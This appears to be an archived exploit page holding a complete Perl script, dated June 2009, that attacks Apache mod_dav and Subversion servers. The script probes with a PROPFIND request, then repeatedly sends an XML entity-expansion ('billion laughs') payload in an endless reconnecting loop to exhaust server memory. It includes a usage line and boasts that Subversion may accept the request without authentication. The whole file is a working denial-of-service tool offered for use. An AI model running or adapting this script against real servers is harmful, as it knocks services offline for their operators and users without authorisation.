<html><head><title>Apache mod_dav / svn Remote Denial of Service Exploit</title></head><pre>###furoffyourcat.pl
### Apache mod_dav / svn Remote Denial of Service Exploit
### by kcope / June 2009
###
### Will exhaust all system memory
### Needs Authentication on normal DAV
###
### This can be especially serious stuff when used against
### svn (subversion) servers!! Svn might let the PROPFIND slip through
### without authentication. bwhahaaha :o)
### use at your own risk!
##################################################################

use IO::Socket;
use MIME::Base64;

sub usage {
	print &quot;Apache mod_dav / svn Remote Denial of Service Exploit\n&quot;;
	print &quot;by kcope in 2009\n&quot;;
	print &quot;usage: perl furoffyourcat.pl &lt;remotehost&gt; &lt;webdav folder&gt; [username] [password]\n&quot;;
	print &quot;example: perl furoffyourcat.pl svn.XXX.com /projects/\n&quot;;exit;
}

if ($#ARGV &lt; 1) {usage();}

$hostname = $ARGV[0];
$webdavfile = $ARGV[1];

$username = $ARGV[2];
$password = $ARGV[3];
                            
$|=1;

$BasicAuth = encode_base64(&quot;$username:$password&quot;);
chomp $BasicAuth;

my $sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $hostname,
                              PeerPort =&gt; 80,
                              Proto    =&gt; 'tcp');
print $sock &quot;PROPFIND $webdavfile HTTP/1.1\r\n&quot;;
print $sock &quot;Host: $hostname\r\n&quot;;
print $sock &quot;Depth: 0\r\n&quot;;
print $sock &quot;Connection: close\r\n&quot;;
if ($username ne &quot;&quot;) {
print $sock &quot;Authorization: Basic $BasicAuth\r\n&quot;;	
}
print $sock &quot;\r\n&quot;;
$x = &lt;$sock&gt;;	

print $x;
if (!($x =~ /207/)) {
while(&lt;$sock&gt;) {
	print;	
}
close($sock);
 print &quot;No PROPFIND on this server and path.\n&quot;;
 exit(0);	
}

$a = &quot;&quot;;
for ($i=1;$i&lt;256;$i++) {		# Here you can increase the XML bomb count
	$k = $i-1;
	$a .= &quot;&lt;!ENTITY x$i \&quot;&amp;x$k;&amp;x$k;\&quot;&gt;\n&quot;
}

$igzml = 
&quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\n&quot;
.&quot;&lt;!DOCTYPE REMOTE [\n&quot;
.&quot;&lt;!ELEMENT REMOTE ANY&gt;\n&quot;
.&quot;&lt;!ENTITY x0 \&quot;foobar\&quot;&gt;\n&quot;
.$a
.&quot;]&gt;\n&quot;
.&quot;&lt;REMOTE&gt;\n&quot;
.&quot;&amp;x$k;\n&quot;
.&quot;&lt;/REMOTE&gt;\n&quot;;

print &quot;Apache mod_dav / svn Remote Denial of Service Exploit\n&quot;;
print &quot;by kcope in 2009\n&quot;;
print &quot;Launching DoS Attack...\n&quot;;

$ExploitRequest =
 &quot;PROPFIND $webdavfile HTTP/1.1\r\n&quot;
.&quot;Host: $hostname\r\n&quot;
.&quot;Depth: 0\r\n&quot;;

if ($username ne &quot;&quot;) {
$ExploitRequest .= &quot;Authorization: Basic $BasicAuth\r\n&quot;;	
}
$ExploitRequest .= &quot;Content-Type: text/xml\r\nContent-Length: &quot;.length($igzml).&quot;\r\n\r\n&quot; . $igzml;

while(1) {
again:
my $sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $hostname,
                              PeerPort =&gt; 80,
                              Proto    =&gt; 'tcp') || (goto again);

print $sock $ExploitRequest;
print &quot;;Pp&quot;;
}

# milw0rm.com [2009-06-01]</pre></html>